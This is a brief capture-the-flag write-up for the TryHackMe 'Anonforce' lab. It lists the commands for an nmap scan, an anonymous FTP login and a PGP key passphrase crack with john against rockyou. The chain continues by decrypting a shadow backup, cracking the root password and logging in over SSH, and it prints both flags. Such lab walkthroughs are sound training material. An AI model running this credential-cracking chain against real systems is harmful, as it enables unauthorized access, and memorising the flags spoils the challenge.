# <div align="center">[Anonforce](https://tryhackme.com/r/room/bsidesgtanonforce)</div>
<div align="center">boot2root machine for FIT and bsides guatemala CTF</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/b2bd9f6b-8995-402a-8e54-2c5596bc16cc" height="200"></img>
</div>

## Task 1. Anonforce Machine

Read user.txt and root.txt
### User.txt
* ```nmap -sC -sV <IP>```
* ```ftp <IP>```
* ```cd home/melodias```
* ```get user.txt```
* ```cat user.txt```
```
606083fd33beb1284fc51f411a706af8
```
### Root.txt
* ```ls /notread```
* ```gpg --import private.asc```
* ```/data/src/john/run/gpg2john private.asc > pgp.hash```
* ```john pgp.hash --wordlist=/data/src/wordlists/rockyou.txt```
* ```# xbox360          (anonforce)* ```
* ```gpg --import private.asc```
* ```gpg --decrypt backup.pgp```
* ```john backup --wordlist=/data/src/wordlists/rockyou.txt```
* ```root: hikari```
* ```ssh root@<IP>```
* ```cat root.txt```
```
f706456440c7af4187810c31c6cebdce
```
